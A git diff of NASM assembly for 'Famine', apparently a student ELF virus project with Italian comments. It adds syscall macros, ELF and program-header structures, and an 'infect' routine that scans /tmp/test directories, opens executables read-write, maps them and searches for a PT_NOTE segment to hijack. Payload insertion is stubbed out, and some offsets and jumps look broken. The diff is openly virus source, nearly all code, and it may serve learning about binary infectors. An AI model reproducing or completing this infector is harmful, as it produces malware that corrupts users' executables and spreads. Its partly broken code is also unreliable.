@@ -67,6 +67,27 @@
 	restore_regx
 %endmacro
 
+%macro lseek_my 3 ; fd , offset , whence
+	save_regx
+	mov rdi, %1
+	mov rsi, %2
+	mov rdx, %3
+	mov rax, 0x08
+	syscall
+	restore_regx
+%endmacro
+
+%macro mmap_my 6 ; addr, size, prot, flags, fd, offset
+	mov rdi, %1
+	mov rsi, %2
+	mov rdx, %3
+	mov r10, %4
+	mov r8, %5
+	mov r9, %6
+	mov rax, 0x09
+	syscall
+%endmacro
+
 %macro strlen_my 1 ; puntatore alla stringa
 	save_regx
 	mov rdi, %1
@@ -131,21 +152,21 @@
 
 %macro check_dir 1 ; stringa della path
 
-		open_my %1, 0, 0
-   		test rax, rax					; if open < 0
-   		js _exit						; dunque se in rax ci sta un numero con il segno -> exit(1)
-   		push rax						; salvo fd
+	open_my %1, 0, 0
+   	test rax, rax					; if open < 0
+   	js _exit						; dunque se in rax ci sta un numero con il segno -> exit(1)
+   	push rax						; salvo fd
 
-   		mov rdi, rax					; 1 arg getdents64
-   		mov rsi, linux_dirent64			; 2 arg
-   		mov rdx, BUF_SIZE				; 3 arg
-   		mov rax, 0xd9					; syscall
-   		syscall
+   	mov rdi, rax					; 1 arg getdents64
+   	mov rsi, linux_dirent64			; 2 arg
+   	mov rdx, BUF_SIZE				; 3 arg
+   	mov rax, 0xd9					; syscall
+   	syscall
 
-   		mov r14, rax					; salvo tot dati letti da getdents64
-   		mov r15, rsi					; salvo il puntatore in r15
-   		pop rax							; richiamo fd della cartella
-   		close_my rax					; chiudo fd
+   	mov r14, rax					; salvo tot dati letti da getdents64
+   	mov r15, rsi					; salvo il puntatore in r15
+   	pop rax							; richiamo fd della cartella
+   	close_my rax					; chiudo fd
 	%%loop_my:
    		add r15, dirent.d_name			; ptr + d_name[]
    		strcat_my %1, r15, buffer		; unisco in buffer il percorso della dir e il nome del file
@@ -153,9 +174,9 @@
    		cmp rax, 0						; se rax == 0 è eseguibile
    		jne %%else_print_file			; altrimenti si va avanti nel loop
    %%if_print_file:
-   		strlen_my r15					; conto caratteri nome file
-   		write_my r15, rax				; stampo nome file
-   		write_my string_space, 2		; stampo \n
+   		mov rdi, buffer					; primo argomento di insert_payload
+   		;call insert_payload				; chiamo la funzione
+   		infect buffer, r15
    		jmp %%end_if
    %%else_print_file:
    %%end_if:
@@ -166,6 +187,78 @@
    		sub r14, r13					; sottraggo la size della struttura dal totale letto
    		cmp r14, 0						; controllo se ho letto tutti i byte restituiti
    		ja %%loop_my
+%endmacro
+
+%macro strcmp_for_link_my 1				; nome senza dir
+	save_regx
+	strlen_my %1						; conto caratteri filename
+	cmp rax, 2							; strlen == 2
+	je %%one_point
+	cmp rax, 3							; strlen == 3
+	je %%two_point
+	ja %%finish_zero					; strlen > 2
+
+	%%one_point:
+		xor rax, rax
+		mov cl, [%1]					; primo carattere del filename in cl
+		cmp cl, 46						; cl == '.'
+		je %%finish_one
+	%%two_point:
+		xor rcx, rcx
+		xor rax, rax
+		mov cl, [%1]					; primo carattere del filename in cl
+		cmp cl, 46						; cl == '.'
+		jne %%finish_zero
+		mov cl, [%1 + 1]				; secondo carattere del filename in cl
+		cmp cl, 46						; cl == '.'
+		je %%finish_one
+	%%finish_one:
+		mov rax, 1						; ritorna 1 se si tratta di '.' oppure '..'
+		jmp %%end
+	%%finish_zero:
+		xor rax, rax					; altrimenti ritorna 0
+		jmp %%end
+	%%end:
+	restore_regx
+%endmacro
+
+%macro infect 2							;nome del file con dir | nome del file senza dir
+	save_regx
+	strcmp_for_link_my %2				; per escludere '.' e '..'
+	cmp rax, 0
+	je %%work_on_file
+	jne %%end
+
+	%%work_on_file:
+		open_my %1, 0x402, 0
+		cmp rax, -1
+		je %%end
+		mov r9, rax						; r9 = fd file
+		lseek_my r9, 0, 2
+		mov r10, rax					; r10 = size file
+		mmap_my 0, r10, 0x3, 0x1, r9, 0
+		cmp rax, -1
+		je %%end
+		mov r8, rax						; r8 = mmap file
+		mov r11, [r8 + ehdr.e_phoff]	; r11 = phdr
+		xor r12, r12
+		mov r12w, [r8 + ehdr.e_phnum]	; r12 = phnum
+		mov rcx, -1
+		%%loop:
+			inc rcx
+			mov r13, [r11 + phdr.p_type]
+			cmp r13, 4	; controllo se è PT_NOTE
+			je %%end_loop_trovato
+			add r11, 30
+			cmp rcx, r12
+			jb %%loop
+		%%end_loop:
+			jmp end
+		%%end_loop_trovato:
+			strlen_my %1
+			write_my %1, rax
+	%%end:
+		restore_regx
 %endmacro
 
 extern insert_payload
@@ -186,6 +279,34 @@ section .text
 		.d_name resb 8
 	endstruc
 
+	struc ehdr
+		.e_ident		resb 16		;	/* File identification. */
+		.e_type			resb 2		;	/* File type. */
+		.e_machine		resb 2		;	/* Machine architecture. */
+		.e_version		resb 4		;	/* ELF format version. */
+		.e_entry		resb 8		;	/* Entry point. */
+		.e_phoff		resb 8		;	/* Program header file offset. */
+		.e_shoff		resb 8		;	/* Section header file offset. */
+		.e_flags		resb 4		;	/* Architecture-specific flags. */
+		.e_ehsize		resb 2		;	/* Size of ELF header in bytes. */
+		.e_phentsize	resb 2		;	/* Size of program header entry. */
+		.e_phnum		resb 2		;	/* Number of program header entries. */
+		.e_shentsize	resb 2		;	/* Size of section header entry. */
+		.e_shnum		resb 2		;	/* Number of section header entries. */
+		.e_shstrndx		resb 2		;	/* Section name strings section. */
+	endstruc
+
+	struc phdr
+		.p_type			resb 4		;	/* Entry type. */
+		.p_flags		resb 4		;	/* Access permission flags. */
+		.p_offset		resb 8		;	/* File offset of contents. */
+		.p_vaddr		resb 8		;	/* Virtual address in memory image. */
+		.p_paddr		resb 8		;	/* Physical address (not used). */
+		.p_filesz		resb 8		;	/* Size of contents in file. */
+		.p_memsz		resb 8		;	/* Size of contents in memory. */
+		.p_align		resb 8		;	/* Alignment in memory and file. */
+	endstruc
+
 _start:
 	check_dir string_dir1
 	check_dir string_dir2
@@ -202,6 +323,9 @@ string_dir1:
 
 string_dir2:
 	db '/tmp/test2/', 0
+
+string_debug:
+	db 'DEBUG', 0
 
 firma:
 	db 'Famine version 1.0 (c)oded by usavoia-usavoia', 0x00
